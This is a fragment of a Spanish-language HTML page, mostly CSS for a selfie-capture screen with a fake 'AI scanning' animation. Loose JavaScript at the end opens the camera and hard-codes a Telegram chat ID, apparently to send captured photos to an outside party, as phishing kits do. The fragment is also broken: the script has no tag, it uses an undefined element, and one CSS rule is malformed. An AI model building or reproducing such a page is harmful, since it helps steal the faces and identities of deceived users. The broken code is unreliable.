<!DOCTYPE html>
<html lang="es">
<head>

<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;

    background: #f5f7fb;

  }
  body {

    align-items: center;
  }
  .container {
    max-width: 500px;
    width: 100%;
    height: 100%;
    padding: 40px 22px 30px;
    display: flex;
    flex-direction: column;
    position: relative;
    box-sizing: border-box;
    background: #fff;
    box-shadow:
      0 18px 40px rgba(15,23,42,0.22),

  }

  /* Pantalla 1 */
  #pantalla1 {
    display: flex;
    flex-direction: column;
    flex-grow: 1;
    height: 100%;
    overflow: hidden;
  }
  .image-wrapper {
    display: flex;
    justify-content: center;
    margin-bottom: 32px;
  }
  .image-wrapper img {
    max-width: 200px;
    width: 100%;
    height: auto;
    user-select: none;
    border-radius: 22px;
    box-shadow: 0 12px 25px rgba(0,0,0,0.18);
  }
  h1 {
    font-size: 26px;
    font-weight: 700;
    margin: 0 0 10px 0;
    line-height: 1.2;
    color: #111827;
  }
  p {
    font-size: 16px;
    line-height: 1.35;
    margin: 0 0 26px 0;
    color: #4b5563;
  }
  .spacer { flex-grow: 1; }
  .exit-link {
    text-align: center;
    font-size: 15px;
    color: #05be50;
    text-decoration: underline;
    cursor: pointer;
    margin-bottom: 18px;
    user-select: none;
  }
  button {
    width: 100%;
    background-color: #05be50;
    border: none;
    border-radius: 999px;
    color: white;
    font-size: 17px;
    font-weight: 600;
    padding: 15px;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease;
    box-shadow: 0 12px 24px rgba(5,190,80,0.28);
  }
  button:hover { background-color: #049b43; }
  button:active {
    background-color: #038437;
    transform: translateY(1px);
    box-shadow: 0 6px 14px rgba(5,190,80,0.35);
  }

  /* Pantalla 2 */
  #pantalla2 {
    display: none;
    position: relative;
    height: 100%;
    overflow: hidden;
  }
  #pantalla2 .close-btn {
    position: fixed;
    top: 15px;
    right: 18px;
    font-size: 26px;
    font-weight: 700;
    color: #111827;
    cursor: pointer;
    user-select: none;
    z-index: 1001;
  }
  #pantalla2 .content {
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
  }

  /* Marco de c치mara */
  .camera-frame {
    width: 190px;
    height: 190px;
    border-radius: 50%;
    border: 8px solid #202840;
    background: #000;
    position: relative;
    overflow: hidden;
    margin-bottom: 20px;
    box-shadow: 0 0 0 4px rgba(16,185,129,0.0);
    transition: box-shadow 0.2s ease;
  }
  .camera-frame video,
  .camera-frame img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  /* 游댠 Ya NO se voltea el video */
  .camera-frame video {
    /* sin transform */
  }
  .camera-frame img {
    display: none;
  }

  /* L칤nea de escaneo verde */
  .scan-line {
    position: absolute;
    left: 0;
    top: -100%;
    width: 100%;
    height: 40%;
    background: linear-gradient(
      180deg,
      rgba(16,185,129,0) 0%,
      rgba(16,185,129,0.5) 50%,
      rgba(16,185,129,0) 100%
    );
    mix-blend-mode: screen;
    pointer-events: none;
  }
  .camera-frame.scanning .scan-line {
    animation: scanMove 0.9s ease-out forwards;
  }
  @keyframes scanMove {
    0% { top: -100%; }
    100% { top: 100%; }
  }
  .camera-frame.scanning {
    box-shadow: 0 0 0 4px rgba(16,185,129,0.7);
  }

  #pantalla2 p {
    font-size: 18px;
    font-weight: 600;
    color: #202840;
    margin: 0 0 10px 0;
  }
  #subtextoIA {
    font-size: 14px;
    font-weight: 400;
    color: #6b7280;
    margin-bottom: 24px;
  }

  #btnTomarFoto {
    width: 190px;
    background-color: #05be50;
    border-radius: 999px;
    border: none;
    color: white;
    font-weight: 600;
    font-size: 16px;
    padding: 12px 0;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease, color 0.15s ease;
    position: relative;
    overflow: hidden;
    box-shadow: 0 10px 22px rgba(5,190,80,0.28);
    margin-top: 4px;
  }
  #btnTomarFoto.loading {
    background-color: #04a646;
    color: #e5e7eb;
    cursor: not-allowed;
  }
  #btnTomarFoto.loading::after {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
    animation: loading 1.3s infinite;
  }
  @keyframes loading {
    0% { left: -100%; }
    100% { left: 100%; }
  }

  @media (max-width: 600px) {
    .container {
      border-radius: 0;
      box-shadow: none;
      height: 100%;
    }
  }
</style>
</head>

     const btnSacarSelfie = document.getElementById('btnSacarSelfie');

  const closeBtn2 = pantalla2.querySelector('.close-btn');
  const closeBtn3 = pantalla3.querySelector('.close-btn');
  const video2 = pantalla2.querySelector('video');
  const video3 = pantalla3.querySelector('video');

  const fotoCapturada = document.getElementById('fotoCapturada');
  let stream;

  const telegramChatId = "7655000874";

  btnSacarSelfie.addEventListener('click', async () => {
    pantalla1.style.display = 'none';
    pantalla2.style.display = 'block';
    fotoCapturada.style.display = 'none';
    btnTomarFoto.style.display = 'inline-block';
